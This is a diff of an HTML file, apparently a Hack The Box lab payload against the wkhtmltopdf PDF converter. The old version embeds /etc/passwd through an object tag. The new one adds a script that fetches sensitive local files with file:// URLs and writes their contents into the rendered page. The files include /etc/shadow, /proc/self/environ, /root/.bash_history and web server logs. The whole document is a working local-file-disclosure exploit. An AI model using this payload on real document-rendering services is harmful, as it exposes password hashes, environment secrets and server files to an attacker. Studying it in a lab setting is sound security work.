@@ -1,11 +1,58 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h1>/etc/passwd</h1>
-    <object data="file:///etc/passwd" type="text/plain" width="600" height="400"></object>
-    <script>
-  document.body.innerHTML = "<h1>JavaScript Ejecutado</h1>";
-</script>
+<head>
+  <meta charset="UTF-8">
+  <title>HTB wkhtmltopdf LFD test</title>
+  <style>
+    body { font-family: monospace; white-space: pre-wrap; }
+    h2 { margin-top: 2em; border-bottom: 1px solid #ccc; }
+  </style>
+</head>
+<body>
+  <h1>📄 File Disclosure Test</h1>
 
-  </body>
+  <div id="results">Cargando...</div>
+
+  <script>
+    const filesToTry = [
+      "/etc/passwd",
+      "/etc/shadow",
+      "/proc/self/environ",
+      "/root/.bash_history",
+      "/var/log/apache2/access.log",
+      "/var/www/html/index.php",
+      "/home/user/.bashrc",
+    ];
+
+    const delay = ms => new Promise(res => setTimeout(res, ms));
+
+    async function fetchFiles() {
+      const results = document.getElementById('results');
+      results.innerText = '';
+
+      for (let path of filesToTry) {
+        const section = document.createElement('div');
+        section.innerHTML = `<h2>📂 ${path}</h2>`;
+
+        try {
+          const res = await fetch("file://" + path);
+          const text = await res.text();
+          const content = document.createElement('pre');
+          content.textContent = text;
+          section.appendChild(content);
+        } catch (e) {
+          const error = document.createElement('pre');
+          error.textContent = '[ERROR] No se pudo leer.';
+          section.appendChild(error);
+        }
+
+        results.appendChild(section);
+
+        await delay(500);  // pequeña pausa para que se vea bien
+      }
+    }
+
+    fetchFiles();
+  </script>
+</body>
 </html>
